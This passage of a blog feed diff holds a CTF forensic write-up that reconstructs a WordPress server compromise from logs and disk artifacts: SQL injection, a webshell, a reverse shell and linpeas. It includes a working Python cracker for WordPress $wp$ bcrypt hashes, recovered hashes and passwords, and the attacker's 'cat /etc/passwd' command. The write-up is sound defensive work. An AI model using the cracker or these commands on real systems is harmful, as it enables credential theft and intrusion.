@@ -1,5 +1,636 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-02-17T10:34:32+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jay’s Cybersecurity Notes</title><subtitle>A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
-</subtitle><author><name>Jaysen</name></author><entry><title type="html">Unorthodox Part 1 – Cyber Jawara Qual 2025</title><link href="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/" rel="alternate" type="text/html" title="Unorthodox Part 1 – Cyber Jawara Qual 2025" /><published>2026-01-17T00:00:00+07:00</published><updated>2026-01-17T00:00:00+07:00</updated><id>http://localhost:4000/CyberJawara2025-Unorthodox%20Part%201</id><content type="html" xml:base="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/"><![CDATA[<p>On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-02-18T10:49:02+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jay’s Cybersecurity Notes</title><subtitle>A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
+</subtitle><author><name>Jaysen</name></author><entry><title type="html">Breached - C2C 2026 Qualification</title><link href="http://localhost:4000/C2C2026Qual-Breached/" rel="alternate" type="text/html" title="Breached - C2C 2026 Qualification" /><published>2026-02-17T00:00:00+07:00</published><updated>2026-02-17T00:00:00+07:00</updated><id>http://localhost:4000/C2C2026Qual-Breached</id><content type="html" xml:base="http://localhost:4000/C2C2026Qual-Breached/"><![CDATA[<p>This challenge is a very interesting and fun forensic scenario. We are placed in the role of the blue team, tasked with investigating a compromised virtual machine and reconstructing the entire attack purely from artifacts.</p>
+
+<p>The scenario feels similar to a boot2root-style machine, but from the defensive perspective: rather than exploiting the system, we must analyze logs and disk artifactsto understand how the attacker gained access, escalated privileges, established persistence, and finally encrypted sensitive data.</p>
+
+<p>I managed to achieve third blood on this challenge, and in this post I will present a full forensic write-up covering the complete attack chain, from initial access to the final impact, based entirely on evidence recovered from the VM.</p>
+
+<p>You can find the challenge files and official resources <a href="https://drive.google.com/file/d/1DriZI_g9GJLee5CsuGM0jXWZylfqxlHm/view?usp=sharing">here</a></p>
+
+<h2 id="breached">Breached</h2>
+
+<h3 id="attachment">Attachment</h3>
+<ul>
+  <li>{390a2cc6-8c86-4007-9034-67927d842338}_copy.vmdk</li>
+</ul>
+
+<h3 id="description">Description</h3>
+<p>A hacker group rooted my server! Please help me recover my files and answer a few questions.</p>
+
+<p>SHA256: ec77e1c3ce6dac9b505d39806d9e63e37ba2c66f0461b7ff01664f1797f045a7</p>
+
+<h3 id="tldr">TL;DR</h3>
+<p>The following diagram summarizes the full attack chain observed in this challenge, showing how the attacker progressed from initial reconnaissance to full system compromise and ransomware deployment.</p>
+
+<p align="center">
+  <img src="/assets/breached/tldr.png" alt="Attack chain diagram" style="max-width: 100%; width: 600px;" />
+</p>
+
+<h3 id="evidence-preparation">Evidence Preparation</h3>
+<p>The first step was to prepare the provided evidence for analysis. The challenge attachment was a virtual disk image (.vmdk), so I mounted the disk into a local virtual machine in read-only mode to avoid modifying any original artifacts.</p>
+
+<p>After mounting the disk, I verified that the filesystem could be accessed correctly and began exploring the directory structure to identify logs, user home directories, and other potential sources of forensic evidence.</p>
+
+<h3 id="question-and-analysis">Question and Analysis</h3>
+<p>Based on the description, it looks like the source of the attack came from the web server, so I first checked which Docker containers were running. 
+<img src="/assets/breached/1.png" alt="alt text" /> 
+From the Docker container list, I observed that a MySQL container and a my-personal-web-wp_service_1 container (WordPress service) were present. Since the author is daffainfo, which is closely associated with WordPress, I suspected that the attack might be related to this service. Therefore, I proceeded to access the WordPress container by opening an interactive shell inside it.
+<img src="/assets/breached/2.png" alt="alt text" /></p>
+
+<h4 id="what-is-the-victim-ip">What is the victim IP?</h4>
+<p>To answer this question, we just need to check the log files. From the access.log files : 
+<img src="/assets/breached/3.png" alt="alt text" />
+The victim IP address is 192.168.56.106.</p>
+
+<p>This can be identified from multiple log entries referencing http://192.168.56.106:8080, which indicates the WordPress server hosting the compromised application.       <br />
+Answer : <code class="language-plaintext highlighter-rouge">192.168.56.106</code></p>
+
+<h4 id="what-is-the-attacker-ip">What is the attacker IP?</h4>
+<p>There was an sqlmap request to the server:
+<img src="/assets/breached/4.png" alt="alt text" />
+So, the attacker ip was 192.168.56.104       <br />
+Answer : <code class="language-plaintext highlighter-rouge">192.168.56.104</code></p>
+
+<h4 id="which-ports-are-exposed-sort-from-the-smallest-to-the-largest">Which ports are exposed? Sort from the smallest to the largest</h4>
+<p><img src="/assets/breached/5.png" alt="alt text" />
+This indicates that:</p>
+<ul>
+  <li>FTP is exposed on port 21</li>
+  <li>SSH is exposed on port 22</li>
+  <li>WordPress (web service) is exposed on port 8080</li>
+</ul>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">21,22,8080</code></p>
+
+<h4 id="the-attacker-attempted-to-log-in-using-anonymous-ftp-access-but-failed-at-what-time-did-this-occur">The attacker attempted to log in using anonymous FTP access but failed. At what time did this occur?</h4>
+<p><img src="/assets/breached/6.png" alt="alt text" /> 
+We could see that the fail login attempt from anonymous was happened on Tue Jan 20 07:55:26 2026</p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">20/01/2026 07:55:26</code></p>
+
+<h4 id="the-attacker-then-performed-web-reconnaissance-using-three-tools-what-were-they-sort-alphabetically">The attacker then performed web reconnaissance using three tools. What were they? Sort alphabetically</h4>
+<p>By analyzing the Apache access log, three different web reconnaissance tools were identified based on their request patterns and User-Agent strings.</p>
+
+<ul>
+  <li>dirsearch  <br />
+  A very large number of requests were sent in a short time window, attempting to access many random and non-existent paths such as:
+  <img src="/assets/breached/7.png" alt="alt text" /> 
+  These requests use a browser-like User-Agent:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/87.0.4280.88 Safari/537.36
+</code></pre></div>    </div>
+    <p>This behavior matches dirsearch, which performs forced browsing while impersonating a real browser User-Agent.</p>
+
+    <p>To prove that the suspicious traffic was generated by dirsearch, I performed a local experiment. I set up a local Python HTTP server and monitored incoming requests while running dirsearch against it. The objective was to directly observe the HTTP headers sent by dirsearch, especially the User-Agent field.
+  <img src="/assets/breached/10.png" alt="alt text" /> 
+  <img src="/assets/breached/11.png" alt="alt text" />
+  This experiment proves that the traffic pattern and User-Agent observed in the compromised server logs are consistent with dirsearch activity.</p>
+  </li>
+  <li>
+    <p>wpscan  <br />
+The following User-Agent appears in the access log:
+<img src="/assets/breached/8.png" alt="alt text" />
+This directly indicates the use of wpscan, a tool for enumerating WordPress users, plugins, and vulnerabilities.</p>
+  </li>
+  <li>
+    <p>nuclei  <br />
+  At first, I identified sqlmap as the third tool. However, after reviewing the access log more carefully, I realized that sqlmap is primarily an exploitation tool, not a reconnaissance tool.</p>
+
+    <p>Further analysis of the access log revealed requests containing the keyword nuclei, for example:
+  <img src="/assets/breached/9.png" alt="alt text" />
+  This request pattern is a known signature of the Nuclei vulnerability scanner.</p>
+  </li>
+</ul>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">dirsearch,nuclei,wpscan</code></p>
+
+<h4 id="what-cve-id-was-exploited-by-the-attacker">What CVE ID was exploited by the attacker?</h4>
+<p>This attack is similar to the previous log challenge, where the attacker exploited a SQL injection vulnerability in the Easy Quotes WordPress plugin. 
+<img src="/assets/breached/12.png" alt="alt text" /> <br />
+Answer : <code class="language-plaintext highlighter-rouge">CVE-2025-26943 </code></p>
+
+<h4 id="what-is-the-old-hash-of-the-admin-user">What is the old hash of the admin user?</h4>
+<p>Because the question asks for the old WordPress admin hash, it means that the administrator password has already been changed. Therefore, the original hash will no longer be present in the current wp_users table.</p>
+
+<p>When I first entered the database container shell, I checked the environment variables using env.
+<img src="/assets/breached/13.png" alt="alt text" />
+We could get a lot of information there. 
+<img src="/assets/breached/14.png" alt="alt text" />
+After logging into MySQL and running:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="k">*</span> FROM wp_users<span class="p">;</span>
+</code></pre></div></div>
+<p><img src="/assets/breached/15.png" alt="alt text" /> 
+I confirmed that the table only shows the latest state of the database, which already contains the modified password hash.
+<img src="/assets/breached/16.png" alt="alt text" /> 
+From the directory listing, it can be seen that binlog.000002 has the largest file size, indicating that most database activity occurred in this binary log file. Therefore, I focused my analysis on this file.
+<img src="/assets/breached/17.png" alt="alt text" /> 
+By extracting readable strings from binlog.000002, multiple WordPress password hashes were observed. Since the hash that appears most frequently is: $wp$2y$12$HExJaTmUXM9JxiegvEHU1.KJmHh.eayKgldvQ9nRx6agpiSCOy35. I submitted it and it’s true. 
+Answer : <code class="language-plaintext highlighter-rouge">$wp$2y$12$HExJaTmUXM9JxiegvEHU1.KJmHh.eayKgldvQ9nRx6agpiSCOy35. </code></p>
+
+<h4 id="what-is-the-old-password-of-the-admin-user">What is the old password of the admin user?</h4>
+<p>Actually when i doing this chall number 8 and ten was the latest i answer correctly caused, at first i try to cracked it by using hashcat but it doesn’t get the answer. Becaused i had answer most all the question except one of this, i had discovered that the user have sudo privilege to all
+<img src="/assets/breached/18.png" alt="alt text" />
+<img src="/assets/breached/19.png" alt="alt text" />
+So from that .env just showed us the admin password  <br />
+Answer : <code class="language-plaintext highlighter-rouge">3eb29d691548c45ea17c2302aa251c55</code></p>
+
+<h4 id="after-that-which-other-cve-id-did-the-attacker-exploit">After that, which other CVE ID did the attacker exploit?</h4>
+<p>After exploring the WordPress Docker container, I found a readme.txt file located at /var/www/html/wp-content/plugins/mstore-api. I copied the contents of this file into Codex and asked it to analyze the plugin version and identify whether it was associated with any known vulnerabilities (CVE).</p>
+
+<p>Based on the version information extracted from the file, Codex indicated that the installed mstore-api plugin was affected by <code class="language-plaintext highlighter-rouge">CVE-2023-3277</code>, identifying it as the likely vulnerable component.  <br />
+Answer : <code class="language-plaintext highlighter-rouge">CVE-2023-3277</code></p>
+
+<h4 id="after-logging-in-the-attacker-changed-the-admin-password-what-is-the-new-password-hash">After logging in, the attacker changed the admin password. What is the new password hash?</h4>
+<p>We already discovered this answer on Q7. <br />
+Answer : <code class="language-plaintext highlighter-rouge">$wp$2y$10$nX7P5HYoKSQSxYd/8WJoReewlYZ025COyQs3.MvY/5hnsN0mZ88fG</code></p>
+
+<h4 id="what-is-the-password-corresponding-to-that-hash">What is the password corresponding to that hash?</h4>
+<p>Same like Q8, first i think about cracking it using hashcat but I found nothing, after doing some research i found this :</p>
+<ul>
+  <li>https://hashcat.net/forum/thread-13369-page-2.html</li>
+  <li>https://github.com/hashcat/hashcat/pull/4512</li>
+</ul>
+
+<p><img src="/assets/breached/20.png" alt="alt text" />
+After i found this one, i asked codex to scripted for me to crack this hash, here’s the script :</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="sh">"""</span><span class="s">Crack WordPress 6.8+ $wp$ bcrypt hashes offline.
+WordPress 6.8+ stores password hashes as:
+  $wp + bcrypt( base64( HMAC_SHA384(password, key=</span><span class="sh">'</span><span class="s">wp-sha384</span><span class="sh">'</span><span class="s">) ) )
+This script scans a wordlist in parallel processes (good for CPU-only boxes).
+</span><span class="sh">"""</span>
+
+<span class="kn">from</span> <span class="n">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">hashlib</span>
+<span class="kn">import</span> <span class="n">hmac</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="n">multiprocessing</span> <span class="kn">import</span> <span class="n">Event</span><span class="p">,</span> <span class="n">Process</span><span class="p">,</span> <span class="n">Queue</span><span class="p">,</span> <span class="n">cpu_count</span>
+<span class="kn">import</span> <span class="n">bcrypt</span>
+
+<span class="k">def</span> <span class="nf">wp68_verify</span><span class="p">(</span><span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">wp_hash</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">wp_hash</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">$wp</span><span class="sh">"</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">hash does not start with $wp</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">bcrypt_hash</span> <span class="o">=</span> <span class="n">wp_hash</span><span class="p">[</span><span class="mi">3</span><span class="p">:]</span>
+    <span class="n">pre</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">hmac</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">wp-sha384</span><span class="sh">"</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha384</span><span class="p">).</span><span class="nf">digest</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">bcrypt</span><span class="p">.</span><span class="nf">checkpw</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span> <span class="n">bcrypt_hash</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">compute_slices</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">workers</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">[</span><span class="nb">tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">]]:</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">stat</span><span class="p">(</span><span class="n">path</span><span class="p">).</span><span class="n">st_size</span>
+    <span class="n">workers</span> <span class="o">=</span> <span class="nf">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">workers</span><span class="p">)</span>
+    <span class="n">step</span> <span class="o">=</span> <span class="nf">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span> <span class="o">//</span> <span class="n">workers</span><span class="p">)</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">workers</span><span class="p">):</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="n">step</span>
+        <span class="n">end</span> <span class="o">=</span> <span class="n">size</span> <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">workers</span> <span class="o">-</span> <span class="mi">1</span> <span class="nf">else </span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">step</span>
+        <span class="n">out</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">out</span>
+
+<span class="k">def</span> <span class="nf">worker</span><span class="p">(</span><span class="n">wordlist</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">start</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">end</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">wp_hash</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">stop</span><span class="p">:</span> <span class="n">Event</span><span class="p">,</span> <span class="n">q</span><span class="p">:</span> <span class="n">Queue</span><span class="p">,</span> <span class="n">max_lines</span><span class="p">:</span> <span class="nb">int</span> <span class="o">|</span> <span class="bp">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">,</span> <span class="n">buffering</span><span class="o">=</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">start</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>  <span class="c1"># align to next newline
+</span>
+            <span class="n">lines</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="k">while</span> <span class="n">f</span><span class="p">.</span><span class="nf">tell</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">end</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">stop</span><span class="p">.</span><span class="nf">is_set</span><span class="p">():</span>
+                <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
+                <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
+                    <span class="k">break</span>
+                <span class="n">pw</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
+                <span class="k">if</span> <span class="ow">not</span> <span class="n">pw</span><span class="p">:</span>
+                    <span class="k">continue</span>
+                <span class="k">if</span> <span class="nf">wp68_verify</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">wp_hash</span><span class="p">):</span>
+                    <span class="n">stop</span><span class="p">.</span><span class="nf">set</span><span class="p">()</span>
+                    <span class="n">q</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">pw</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">replace</span><span class="sh">"</span><span class="p">))</span>
+                    <span class="k">return</span>
+                <span class="n">lines</span> <span class="o">+=</span> <span class="mi">1</span>
+                <span class="k">if</span> <span class="n">max_lines</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">lines</span> <span class="o">&gt;=</span> <span class="n">max_lines</span><span class="p">:</span>
+                    <span class="k">return</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">q</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">__error__:</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="n">ap</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">()</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--hash</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Full $wp$ hash</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--wordlist</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--workers</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="nf">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nf">cpu_count</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
+    <span class="n">ap</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">--max-lines-per-worker</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">ap</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+    <span class="n">wp_hash</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="nb">hash</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">wp_hash</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">$wp$2</span><span class="sh">"</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">error: expected hash to start with $wp$2</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">2</span>
+
+    <span class="n">workers_n</span> <span class="o">=</span> <span class="nf">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">workers</span><span class="p">)</span>
+    <span class="n">slices</span> <span class="o">=</span> <span class="nf">compute_slices</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">wordlist</span><span class="p">,</span> <span class="n">workers_n</span><span class="p">)</span>
+
+    <span class="n">stop</span> <span class="o">=</span> <span class="nc">Event</span><span class="p">()</span>
+    <span class="n">q</span><span class="p">:</span> <span class="n">Queue</span> <span class="o">=</span> <span class="nc">Queue</span><span class="p">()</span>
+    <span class="n">procs</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span> <span class="ow">in</span> <span class="n">slices</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">wordlist</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">wp_hash</span><span class="p">,</span> <span class="n">stop</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">max_lines_per_worker</span><span class="p">),</span> <span class="n">daemon</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+        <span class="n">procs</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+    <span class="n">found</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">err</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">msg</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.25</span><span class="p">)</span>
+                <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="nb">str</span><span class="p">)</span> <span class="ow">and</span> <span class="n">msg</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">__error__:</span><span class="sh">"</span><span class="p">):</span>
+                    <span class="n">err</span> <span class="o">=</span> <span class="n">msg</span>
+                    <span class="n">stop</span><span class="p">.</span><span class="nf">set</span><span class="p">()</span>
+                    <span class="k">break</span>
+                <span class="n">found</span> <span class="o">=</span> <span class="n">msg</span>
+                <span class="n">stop</span><span class="p">.</span><span class="nf">set</span><span class="p">()</span>
+                <span class="k">break</span>
+            <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+                <span class="k">pass</span>
+            <span class="k">if</span> <span class="nf">all</span><span class="p">(</span><span class="ow">not</span> <span class="n">p</span><span class="p">.</span><span class="nf">is_alive</span><span class="p">()</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">procs</span><span class="p">):</span>
+                <span class="k">break</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="n">stop</span><span class="p">.</span><span class="nf">set</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">procs</span><span class="p">:</span>
+            <span class="n">p</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">err</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">err</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">2</span>
+    <span class="k">if</span> <span class="n">found</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">1</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">found</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="k">raise</span> <span class="nc">SystemExit</span><span class="p">(</span><span class="nf">main</span><span class="p">())</span>
+</code></pre></div></div>
+<p><img src="/assets/breached/21.png" alt="alt text" />
+Answer : <code class="language-plaintext highlighter-rouge">princess</code></p>
+
+<h4 id="after-that-the-attacker-planted-a-webshell-what-is-its-full-path">After that, the attacker planted a webshell. What is its full path?</h4>
+<p>While searching to answer Q9, i had found this webshell first on /var/www/html/wp-content/plugins/hello.php, i 100% sure that was the webshell because it was obfuscated.
+<img src="/assets/breached/22.png" alt="alt text" />
+Answer : <code class="language-plaintext highlighter-rouge">/var/www/html/wp-content/plugins/hello.php</code></p>
+
+<h4 id="what-key-and-iv-were-used-by-the-attackers-web-shell">What key and IV were used by the attacker’s web shell?</h4>
+<p>I asked codex to obfuscated the webshell while i was try to solved the other question. I also give him the context from this blog https://b-viguier.github.io/PhpFk/
+Here’s the reseult : 
+<img src="/assets/breached/23.png" alt="alt text" />
+Answer : <code class="language-plaintext highlighter-rouge">10b29258c7e57eff:0fd7943d377fd8aa</code></p>
+
+<h4 id="what-was-the-first-command-executed-by-the-attacker">What was the first command executed by the attacker?</h4>
+<p>Because we already know the webshell was saved as hello.php, we just need to grep all the requests to the server with an endpoint : “hello.php?1337=…”.
+<img src="/assets/breached/24.png" alt="alt text" /> 
+Because we already know the key and iv, next we just need to decrypt that command sent by the attacker.
+<img src="/assets/breached/25.png" alt="alt text" /> 
+The decrypted commands show that the attacker first enumerated /etc/passwd, then established a PHP-based reverse shell to 192.168.56.104:3821, indicating successful remote code execution. 
+Answer : <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code></p>
+
+<h4 id="after-that-the-attacker-downloaded-a-file-and-placed-it-in-a-certain-path-what-is-the-full-path">After that, the attacker downloaded a file and placed it in a certain path. What is the full path?</h4>
+<p>First, I checked the /tmp directory and found a file named lin.sh. I am confident this file corresponds to linpeas.sh (https://github.com/Cyberw1ng/Bug-Bounty/blob/main/linpeas.sh) , a commonly used Linux privilege escalation enumeration script.</p>
+
+<p>Attackers typically execute linpeas.sh after obtaining a user-level shell in order to scan the system for misconfigurations and potential privilege escalation paths to root. We can confirmed this one by check the timestamp : 
+<img src="/assets/breached/27.png" alt="alt text" /> 
+<img src="/assets/breached/26.png" alt="alt text" /> 
+This assumption is supported by the file timestamp. The modification time of lin.sh is January 20 at 09:26, which aligns with the timeframe when the attacker gained shell access. This indicates that the attacker downloaded the script immediately after obtaining the shell and used it to perform local enumeration.  <br />
+Answer : <code class="language-plaintext highlighter-rouge">/tmp/lin.sh</code></p>
+
+<h4 id="which-user-did-the-attacker-log-in-as-next">Which user did the attacker log in as next?</h4>
